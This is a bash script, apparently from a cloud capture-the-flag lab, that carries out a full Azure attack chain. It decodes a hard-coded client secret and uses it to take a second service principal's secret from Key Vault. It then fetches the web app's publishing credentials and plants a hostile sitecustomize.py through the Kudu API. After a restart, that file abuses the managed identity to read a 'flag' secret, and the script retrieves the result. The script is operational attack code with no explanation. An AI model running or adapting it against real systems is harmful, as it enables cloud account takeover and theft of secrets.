#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-reporting-prod-eus
SITE=app-tbl-reporting-prod
SYNC_ID=58108da8-044e-4d7e-9a46-92e6179b30be
SYNC_SEC=$(printf %s "fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==" | base64 -d)
sp_tok(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=$3/.default" | jq -r '.access_token'; }
PVT=$(sp_tok "$SYNC_ID" "$SYNC_SEC" "https://vault.azure.net")
RSJSON=$(curl -s "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" -H "Authorization: Bearer $PVT" | jq -r '.value')
RS_ID=$(echo "$RSJSON" | jq -r '.appId'); RS_SEC=$(echo "$RSJSON" | jq -r '.clientSecret')
ARM=$(sp_tok "$RS_ID" "$RS_SEC" "https://management.azure.com")
BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE"
PUB=$(curl -s -X POST "$BASE/config/publishingcredentials/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '')
KU=$(echo "$PUB" | jq -r '.properties.publishingUserName'); KP=$(echo "$PUB" | jq -r '.properties.publishingPassword')
SCM="https://$SITE.scm.azurewebsites.net"
cat > sc.py <<'PY'
import os, json, urllib.request
def g(u,h):
    try:
        return urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=10).read().decode()
    except Exception as e:
        return "ERR:"+repr(e)
out="/home/site/wwwroot/.hv_flag.out"
ie=os.environ.get("IDENTITY_ENDPOINT"); ih=os.environ.get("IDENTITY_HEADER")
r=[]
if ie:
    t=g(ie+"?resource=https://vault.azure.net&api-version=2019-08-01&client_id=7a85156a-01c4-4e61-8472-40a92107159b",{"X-IDENTITY-HEADER":ih})
    r.append("TOK:"+t[:60])
    try:
        at=json.loads(t)["access_token"]
        r.append("FLAG:"+g("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",{"Authorization":"Bearer "+at}))
    except Exception as e:
        r.append("PE:"+repr(e))
else:
    r.append("NO_IE")
try:
    open(out,"w").write(chr(10).join(r))
except Exception as e:
    pass
PY
curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/sitecustomize.py" -H "If-Match: *" --data-binary @sc.py -o /dev/null -w "PUTSITE=%{http_code}\n"
curl -s -X POST "$BASE/restart?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '' -o /dev/null -w "RESTART=%{http_code}\n"
sleep 45
curl -s "https://$SITE.azurewebsites.net/" -o /dev/null -w "APP=%{http_code}\n"
sleep 12
echo "=== .hv_flag.out ==="
curl -s -u "$KU:$KP" "$SCM/api/vfs/site/wwwroot/.hv_flag.out"
echo
echo "ALL_DONE"
